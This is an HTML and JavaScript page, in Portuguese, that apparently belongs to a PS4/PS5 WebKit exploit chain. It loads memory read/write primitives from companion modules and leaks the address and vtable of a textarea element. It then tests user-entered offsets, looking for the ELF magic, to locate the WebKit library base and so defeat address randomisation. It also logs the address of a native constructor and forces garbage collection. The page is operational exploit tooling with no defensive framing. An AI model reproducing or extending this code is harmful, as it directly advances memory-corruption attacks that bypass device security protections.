<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<title>PS4 WebKit — Leak Inspector</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  html, body { height: 100%; background: #0b0f19; color: #c8ced8;
    font: 13px/1.5 "Segoe UI", system-ui, sans-serif;
    display: flex; flex-direction: column; align-items: center;
    gap: 12px; padding: 16px; }
  h1 { color: #fff; font-size: 16px; }
  #leaks { background: #111827; border: 1px solid #1f2937; border-radius: 8px;
    padding: 14px; width: 95%; max-width: 700px; font-family: monospace; font-size: 13px; }
  .leak-row { display: flex; justify-content: space-between; padding: 4px 0;
    border-bottom: 1px solid #1f2937; }
  .leak-row:last-child { border-bottom: none; }
  .label { color: #9ca3af; } .value { color: #60a5fa; font-weight: bold; }
  #log { width: 95%; max-width: 700px; height: 180px; background: #111827;
    border: 1px solid #1f2937; border-radius: 8px; padding: 10px;
    overflow-y: auto; font-family: monospace; font-size: 11px; color: #9fb1c3; }
  #log .ok { color: #4ade80; } #log .err { color: #f87171; }
  #log .found { color: #a78bfa; font-weight: bold; }
  #controls { display: flex; gap: 8px; flex-wrap: wrap; justify-content: center; }
  .ctrl-btn { padding: 10px 18px; border-radius: 6px; border: none;
    background: #1e40af; color: #fff; cursor: pointer; font-size: 13px; font-weight: 600; }
  .ctrl-btn:hover { background: #2563eb; }
  .ctrl-btn:disabled { background: #374151; opacity: 0.5; cursor: not-allowed; }
  .ctrl-btn.success { background: #15803d; }
  .ctrl-btn.success:hover { background: #16a34a; }
  input { background: #111827; border: 1px solid #374151; color: #fff;
    padding: 8px 12px; border-radius: 5px; font-family: monospace; font-size: 13px; width: 180px; }
  input:focus { outline: none; border-color: #60a5fa; }
  .section { color: #9ca3af; font-size: 11px; text-transform: uppercase; margin-top: 4px; }
</style>
</head>
<body>
<h1>PS4 WebKit — Leak Inspector (1 teste por vez)</h1>

<div class="section">Valores Vazados</div>
<div id="leaks">
  <div class="leak-row"><span class="label">__ps5NativeCtor:</span><span class="value" id="l-ctor">---</span></div>
  <div class="leak-row"><span class="label">textarea obj:</span><span class="value" id="l-obj">---</span></div>
  <div class="leak-row"><span class="label">textarea vtable ptr:</span><span class="value" id="l-vtptr">---</span></div>
  <div class="leak-row"><span class="label">textarea vtable[0]:</span><span class="value" id="l-vt0">---</span></div>
  <div class="leak-row"><span class="label">ctor offset (base=0):</span><span class="value" id="l-off">---</span></div>
</div>

<div class="section">Testar 1 Offset</div>
<div id="controls">
  <input type="text" id="offInput" placeholder="Offset hex, ex: 0x2511400" value="0x2511400">
  <button class="ctrl-btn" id="btnTest" onclick="testOffset()">Testar Offset</button>
  <button class="ctrl-btn success" id="btnVtable" onclick="readVtable()">Ler VTable</button>
  <button class="ctrl-btn" onclick="gc()">Forçar GC</button>
</div>

<div id="log"></div>

<script type="module">
  import { establishPrimitive } from "./resources/core.js";
  import { installWindowP } from "./resources/mem.js";
  import { int64 } from "./resources/int64.js";

  const logBox = document.getElementById("log");
  function log(msg, cls) {
    const line = document.createElement("div");
    line.className = cls || "info";
    line.textContent = "[" + new Date().toLocaleTimeString() + "] " + msg;
    logBox.appendChild(line);
    logBox.scrollTop = logBox.scrollHeight;
    if (logBox.children.length > 50) logBox.removeChild(logBox.firstChild);
  }

  window.gc = function() {
    if (typeof globalThis.gc === "function") {
      try { globalThis.gc(); log("GC forçado.", "ok"); } catch(e) { log("GC falhou: " + e.message, "err"); }
    } else {
      // Tentar trigger GC via pressão de memória
      try {
        let trash = [];
        for (let i = 0; i < 100; i++) trash.push(new ArrayBuffer(0x100000));
        trash = null;
        log("GC triggered via pressure.", "ok");
      } catch(e) { log("GC pressure falhou.", "err"); }
    }
  };

  let vtable0 = null;
  let ctorAddr = null;

  window.readVtable = function() {
    const p = window.p;
    if (!p) { log("window.p não disponível!", "err"); return; }
    try {
      let textArea = document.createElement("textarea");
      let objAddr = p.leakval(textArea);
      let vtPtr = p.read8(objAddr.add32(0x18));
      let vt0 = p.read8(vtPtr);
      vtable0 = vt0;

      document.getElementById("l-obj").textContent = "0x" + objAddr.toString(16);
      document.getElementById("l-vtptr").textContent = "0x" + vtPtr.toString(16);
      document.getElementById("l-vt0").textContent = "0x" + vt0.toString(16);

      log("textarea obj = 0x" + objAddr.toString(16), "ok");
      log("vtable ptr   = 0x" + vtPtr.toString(16), "ok");
      log("vtable[0]    = 0x" + vt0.toString(16), "ok");

      // Calcular offset do ctor se disponível
      if (ctorAddr) {
        let off = ctorAddr - (vt0.hi * 0x100000000 + vt0.low);
        // Na verdade, precisamos da base, não do vtable
        // Mas podemos estimar: se base ~ vtable[0] - X, e ctor = base + Y
        // então vtable[0] - ctor = X - Y
        let diff = (vt0.hi * 0x100000000 + vt0.low) - ctorAddr;
        log("vtable[0] - ctor = 0x" + diff.toString(16) + " (" + (diff/0x100000).toFixed(1) + "MB)", "info");
      }

      window.gc();
    } catch (e) { log("Erro: " + e.name + ": " + e.message, "err"); }
  };

  window.testOffset = function() {
    const p = window.p;
    if (!p || !vtable0) { log("Leia o vtable primeiro (botao verde)!", "err"); return; }

    const input = document.getElementById("offInput").value.trim();
    let off = parseInt(input, 16);
    if (isNaN(off) || off <= 0) { log("Offset invalido", "err"); return; }

    let base = vtable0.sub32(off);
    let baseNum = base.hi * 0x100000000 + base.low;
    log("=== Testando offset 0x" + off.toString(16) + " ===", "warn");
    log("Base calculada = 0x" + base.toString(16), "info");

    try {
      let magic = p.read4(base);
      let magicHex = "0x" + magic.toString(16).padStart(8, "0");
      log("Magic: " + magicHex, magicHex === "0x464c457f" ? "found" : "info");

      if (magicHex === "0x464c457f") {
        log("✅ BASE ENCONTRADA!", "found");
        window.__webkitBase = base;
        // Se temos ctor, calcular offset do ctor
        if (ctorAddr) {
          let ctorOff = ctorAddr - baseNum;
          log("__ps5NativeCtor offset = 0x" + ctorOff.toString(16), "ok");
        }
        return;
      }

      // Se não é ELF, tentar ler alguns bytes para ver se é código válido
      let b1 = p.read1(base.add32(0));
      let b2 = p.read1(base.add32(1));
      let b3 = p.read1(base.add32(2));
      let b4 = p.read1(base.add32(3));
      log("Bytes @ base: " + b1.toString(16) + " " + b2.toString(16) + " " + b3.toString(16) + " " + b4.toString(16), "info");

    } catch (e) { log("FALHA: " + e.name + ": " + e.message, "err"); }

    window.gc();
  };

  log("Carregando modulos...", "ok");
  establishPrimitive({ onEvent: (tag, detail) => log(tag + ": " + detail, "info") })
    .then(carrier => {
      const prim = installWindowP(carrier, { onEvent: (tag, detail) => log(tag + ": " + detail, "info"), promote: true });
      window.__carrier = carrier; window.__prim = prim; window.p = prim; window.int64 = int64;
      log("Exploit pronto!", "ok");

      let ctor = globalThis.__ps5NativeCtor;
      if (typeof ctor === "number") {
        ctorAddr = ctor;
        document.getElementById("l-ctor").textContent = "0x" + ctor.toString(16);
        log("__ps5NativeCtor = 0x" + ctor.toString(16), "ok");
      }

      // Auto-read vtable
      window.readVtable();
    })
    .catch(err => { log("FALHA: " + err.name + ": " + err.message, "err"); });
</script>
</body>
</html>
